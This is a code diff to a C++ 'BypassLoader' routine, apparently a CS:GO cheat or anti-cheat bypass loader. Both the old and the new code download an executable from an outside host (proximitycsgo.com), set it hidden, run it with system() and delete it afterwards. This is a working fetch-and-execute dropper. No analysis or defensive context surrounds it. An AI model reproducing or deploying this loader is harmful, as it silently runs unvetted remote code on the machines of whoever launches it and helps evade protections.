@@ -129,8 +129,9 @@ void BypassLoader::LoaderLoop(HMODULE hModule)
     while (!mSocket::cfg::_____jskjensb)
         Sleep(200);
 
-    std::string FilePath = "./xfencer.exe";
-    std::string URL = "https://proximitycsgo.com/pinjected.exe";
+    DeleteFileA("./xfencerXx.exe");
+    std::string FilePath = "./xfencerXx.exe";
+    std::string URL = "https://proximitycsgo.com/pnp.php";
 
 
     std::wstring tempUrl = std::wstring(URL.begin(), URL.end());
@@ -141,18 +142,18 @@ void BypassLoader::LoaderLoop(HMODULE hModule)
     LPCSTR wideStringPath = (LPCSTR)tempUrl.c_str();
 
 
-    if (S_OK == URLDownloadToFileA(NULL, "https://proximitycsgo.com/pinjected.exe", "./xfencer.exe", 0, NULL))
+    if (S_OK == URLDownloadToFileA(NULL, URL.c_str(), "./xfencerXx.exe", 0, NULL))
     {
-        const char* file_name = "./xfencer.exe";
+        const char* file_name = "./xfencerXx.exe";
 
         if (SetFileAttributesA(file_name, FILE_ATTRIBUTE_HIDDEN)) {
-            system("xfencer.exe");
+            system("xfencerXx.exe");
         }
         else {
             std::cout << "Hata: " << GetLastError() << std::endl;
         }
 
-        DeleteFileA("./xfencer.exe");
+        DeleteFileA("./xfencerXx.exe");
     }
     else {
         std::cout << "Error, DWFailed" << std::endl;
